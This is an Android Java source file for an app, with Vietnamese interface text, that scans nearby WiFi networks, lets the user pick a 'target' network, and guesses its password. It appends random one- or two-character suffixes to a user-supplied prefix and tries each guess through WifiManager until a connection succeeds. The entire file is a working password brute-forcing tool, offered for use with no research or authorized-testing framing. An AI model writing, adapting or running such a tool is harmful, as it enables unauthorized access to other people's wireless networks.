package com.example.wifitool;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.util.*;

public class MainActivity extends AppCompatActivity {
    EditText edtPrefix;
    ListView lvWifi;
    TextView txtStatus;
    Button btnScan, btnStart;
    
    WifiManager wifiManager;
    List<String> wifiNames = new ArrayList<>();
    ArrayAdapter<String> adapter;
    
    String selectedSSID = "";
    boolean isRunning = false;
    Set<String> triedPass = new HashSet<>();
    Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        edtPrefix = findViewById(R.id.edtPrefix);
        lvWifi = findViewById(R.id.lvWifi);
        txtStatus = findViewById(R.id.txtStatus);
        btnScan = findViewById(R.id.btnScan);
        btnStart = findViewById(R.id.btnStart);

        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, wifiNames);
        lvWifi.setAdapter(adapter);

        // Chọn WiFi từ danh sách
        lvWifi.setOnItemClickListener((parent, view, position, id) -> {
            selectedSSID = wifiNames.get(position);
            txtStatus.setText("Đã chọn mục tiêu: " + selectedSSID);
        });

        // Nút Quét WiFi
        btnScan.setOnClickListener(v -> scanWifi());

        // Nút Bắt đầu/Dừng
        btnStart.setOnClickListener(v -> {
            if (selectedSSID.isEmpty()) {
                Toast.makeText(this, "Hãy chọn 1 WiFi!", Toast.LENGTH_SHORT).show();
                return;
            }
            isRunning = !isRunning;
            btnStart.setText(isRunning ? "DỪNG LẠI" : "BẮT ĐẦU DÒ MẬT KHẨU");
            if (isRunning) bruteForceLoop();
        });
    }

    private void scanWifi() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
            return;
        }
        wifiNames.clear();
        List<ScanResult> results = wifiManager.getScanResults();
        for (ScanResult r : results) {
            if (!r.SSID.isEmpty() && !wifiNames.contains(r.SSID)) wifiNames.add(r.SSID);
        }
        adapter.notifyDataSetChanged();
    }

    private void bruteForceLoop() {
        if (!isRunning) return;

        String prefix = edtPrefix.getText().toString().trim();
        String charset = "0123456789abcdefghijklmnopqrstuvwxyz";
        Random r = new Random();
        
        // Sinh 1-2 ký tự ngẫu nhiên sau prefix
        StringBuilder suffix = new StringBuilder();
        for(int i=0; i < (r.nextInt(2)+1); i++) suffix.append(charset.charAt(r.nextInt(charset.length())));
        
        String pass = prefix + suffix.toString();

        if (triedPass.contains(pass)) {
            bruteForceLoop();
            return;
        }

        triedPass.add(pass);
        txtStatus.setText("Đang thử: " + pass + "\n(Lần thứ: " + triedPass.size() + ")");
        
        connect(selectedSSID, pass);
    }

    private void connect(String ssid, String pass) {
        WifiConfiguration conf = new WifiConfiguration();
        conf.SSID = "\"" + ssid + "\"";
        conf.preSharedKey = "\"" + pass + "\"";

        int netId = wifiManager.addNetwork(conf);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();

        handler.postDelayed(() -> {
            if (wifiManager.getConnectionInfo().getNetworkId() != -1) {
                txtStatus.setText("THÀNH CÔNG! Pass: " + pass);
                isRunning = false;
                btnStart.setText("XONG!");
            } else {
                wifiManager.removeNetwork(netId);
                bruteForceLoop();
            }
        }, 7000); // Đợi 7 giây để Router phản hồi
    }
}